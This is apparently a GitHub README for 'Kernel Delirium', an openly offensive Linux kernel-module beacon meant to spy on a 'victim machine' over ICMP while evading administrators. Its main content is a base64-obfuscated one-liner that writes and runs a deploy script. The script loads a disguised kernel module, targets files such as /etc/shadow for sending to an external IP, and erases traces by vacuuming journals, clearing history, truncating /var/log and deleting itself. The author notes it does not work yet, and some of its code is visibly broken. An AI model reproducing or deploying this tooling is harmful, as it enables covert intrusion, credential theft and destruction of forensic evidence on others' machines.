# Kernel Delirium :smoking: :penguin: (Not working yet, still requires development)

## What is it about

My idea was to create a kernel module for linux machine which is basically a beacon to spy on machine using ICMP protocoll which is usually less suspicious then tcp/udp f.ex, so even some firewalls don't mind. Additionally inexperienced System admin is not gonna try to look it up in kernel modules. Maybe in future to hide it better, I'll include the module in the system one.

## How to use?

To use this software you should install a desktop app on your machine and run deploy_and_clean.py (I recommend to assemble file with base64 with command below) on the victim machine, cause that's more time efficient.

### Victim machine :syringe: :computer:

```bash
echo "aW1wb3J0IG9zCmltcG9ydCBhcmdwYXJzZQoKI21vZHVsZV9uYW1lIGlzIG5lZWRlZCB0byBoaWRl
IHRoZSBleHBsb2l0IHVuZGVyIHRoZSBuYW1lIHdoaWNoIGlzIG5vdCBzdXNwaWNpb3VzCmRlZiBl
eHBsb2l0X2dlbihleHRlcm5hbF9pcCwgZXh0ZXJuYWxfcG9ydCwgbW9kdWxlX25hbWUgPSAiZXRo
ZXJuZXQuYyIsIGZpbGVzID0gW10sIHVwZGF0ZV9wZXJpb2Q9MSk6CiAgICBNT0RVTEVfQ09ERT0i
IiIiIiIKICAgIHByaW50KGV4dGVybmFsX2lwLCBleHRlcm5hbF9wb3J0LCBtb2R1bGVfbmFtZSwg
dXBkYXRlX3BlcmlvZCkKICAgIHByaW50KGZpbGVzWzBdKQogICAgcHJpbnQoZmlsZXNbMV0pCgpk
ZWYgbG9hZF9tb2R1bGUobW9kdWxlTmFtZSk6CiAgICBNQUtFRklMRT1mIiIiQ09ORklHX01PRFVM
RV9TSUc9bgpvYmotbSArPSB7bW9kdWxlTmFtZX0KCmFsbDoKCXN1ZG8gYXB0LWdldCBpbnN0YWxs
IC0tcmVpbnN0YWxsIC15IGxpbnV4LWhlYWRlcnMtJCh1bmFtZSAtcikKCW1ha2UgLUMgL2xpYi9t
b2R1bGVzLyQoc2hlbGwgdW5hbWUgLXIpL2J1aWxkIE09JChQV0QpIG1vZHVsZXMKCXN1ZG8gaW5z
bW9kIGR2dC1kcml2ZXIua28KCmNsZWFuOgoJbWFrZSAtQyAvbGliL21vZHVsZXMvJChzaGVsbCB1
bmFtZSAtcikvYnVpbGQgTT0kKFBXRCkgY2xlYW4KCXJtIC1yZiAqLmMgKi5vICoua28gKi5tb2Qg
Ki5tb2QuYyIiIgoKICAgIHdpdGggb3BlbigiTWFrZWZpbGVfdHN0IiwgInciKSBhcyBmOgogICAg
ICAgIGYud3JpdGUoTUFLRUZJTEUpCiAgICAjb3Muc3lzdGVtKCIgbWFrZSIpCgoKZGVmIGNsZWFu
dXAoKToKICAgIG9zLnN5c3RlbSgiIG1ha2UgY2xlYW4iKQogICAgb3Muc3lzdGVtKCIgam91cm5h
bGN0bCAtLXZhY3V1bS10aW1lPTEwZCIpCiAgICBvcy5zeXN0ZW0oIiBoaXN0b3J5IC1jIikKICAg
IGZvciBmaWxlIGluIG9zLmxpc3RkaXIoIi92YXIvbG9nIik6CiAgICAgICAgd2l0aCBvcGVuOgog
ICAgICAgICAgICBmaWxlLnRydW5jYXRlKCkKICAgIG9zLnJlbW92ZShfX2ZpbGVfXykKCmRlZiBt
YWluKCk6CiAgICBwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbiA9
ICJUaGlzIHNjcmlwdCBzaG91bGQgYmUgcmFuIGFzIHJvb3Qgb24gZXhwb2l0ZWQgbWFjaGluZSB0
byBjcmVhdGUgYW5kIGxvYWQgYSBzdWl0YWJsZSBmb3IgeW91ciB0YXNrcyBjIGtlcm5lbCBtb2R1
bGUgdG8gc3B5IG9uIHNwZWNpZmljIGZpbGVzIGFuZCBzdGF5IGhpZGRlbiIpCiAgICBwYXJzZXIu
YWRkX2FyZ3VtZW50KCItLWV4dGVybmFsX2lwIiwgdHlwZSA9IHN0ciwgaGVscCA9ICJQcm92aWRl
IGFuIGV4dGVybmFsIG1hY2hpbmUgSVAgQUREUkVTUyB0aGF0IHdpbGwgYmUgdXNlZCIpCiAgICBw
YXJzZXIuYWRkX2FyZ3VtZW50KCItLWV4dGVybmFsX3BvcnQiLCB0eXBlID0gc3RyLCBoZWxwID0g
IlByb3ZpZGUgYW4gZXh0ZXJuYWwgbWFjaGluZSBQT1JUIHRoYXQgd2lsbCBiZSB1c2VkIiwgZGVm
YXVsdD0iMjIiKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLS1tb2R1bGVfbmFtZSIsIHR5cGUg
PSBzdHIsIGhlbHAgPSAiTmFtZSBvZiB0aGUgbW9kdWxlIGYuZXggZXRoZXJuZXRfbW9kdWxlLCBp
dCdzIGJldHRlciBub3QgdG8gaGF2ZSB2aXJ1cyBvciBleHBvaXQgbmFtZSBvYnZpb3VzbHkiKQog
ICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLS1maWxlcyIsIHR5cGUgPSBzdHIsIG5hcmdzPSIrIiwg
aGVscD0iSGVyZSBhIGxpc3Qgb2YgZmlsZXMgdG8gYmUgc2VudCBzaG91bGQgYmUgcHJvdmlkZWQg
Zi5leCAvZXRjL2hvc3RzIC9ldGMvc2hhZG93cyIsIGRlZmF1bHQ9Ii9ldGMvc2hhZG93cyIpCiAg
ICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItLXVwZGF0ZV9wZXJpb2QiLCB0eXBlID0gc3RyLCBoZWxw
ID0gIlRoZSBpbnRlcnZhbCBvZiB0aW1lIGluIHdoaWNoIGluZm9ybWF0aW9uIHNob3VsZCBiZSBn
YXRoZXJlZCBhZ2FpbiBhbmQgc2VuZCAoaW4gaG91cnMpLiBZb3Ugc2hvdWxkIGtub3cgdGhhdCB0
byBhdm9pZCBzdXNwaWNpb25zLCB0aW1lIHBlcmlvZCBtYXkgZGlmZmVyIHVwIHRvIDExIG1pbiIs
IGRlZmF1bHQ9IjEiKQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKICAgIGV4cGxvaXRf
Z2VuKGFyZ3MuZXh0ZXJuYWxfaXAsIGFyZ3MuZXh0ZXJuYWxfcG9ydCwgYXJncy5tb2R1bGVfbmFt
ZSwgYXJncy5maWxlcywgYXJncy51cGRhdGVfcGVyaW9kKQogICAgbG9hZF9tb2R1bGUoYXJncy5t
b2R1bGVfbmFtZSkKICAgIGNsZWFudXAoKQogICAgcmV0dXJuIDA7CgppZiBfX25hbWVfXyA9PSAi
X19tYWluX18iOgogICAgbWFpbigpCg==" | base64 -d  >> deploy_and_clean.py && python3 deploy_and_clean.py
```

### Your machine :man_technologist:
```bash
sudo apt-get install kernel-delirium (Not gonna work yet)
```

```bash
kernel-delirium
```

## Supported distros:
 - Debian-based :white_check_mark:
 - Arch-based :x:
 - OpenSuse :x:

## Currently working on :hammer_and_wrench: :
- Kernel module itself sending the information
- Desktop app receiveng the information